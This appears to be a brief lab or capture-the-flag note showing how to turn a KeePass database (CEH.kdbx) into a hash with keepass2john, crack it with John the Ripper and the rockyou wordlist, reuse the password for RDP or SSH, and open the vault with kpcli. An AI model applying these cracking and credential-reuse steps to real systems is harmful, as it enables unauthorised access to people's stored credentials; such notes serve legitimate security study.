

here we need to convert [[kdbx]] and use that to login 
```powershell
keepass2john CEH.kdbx > hash
```

cat hash to confirm
```powershell
cat hash
```

crack the hash 
```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

try to rdp, ssh using the found password

also we can open the file using the following command 
```powershell
# replace the file name
kpcli --kdb=CEH.kdbx
```
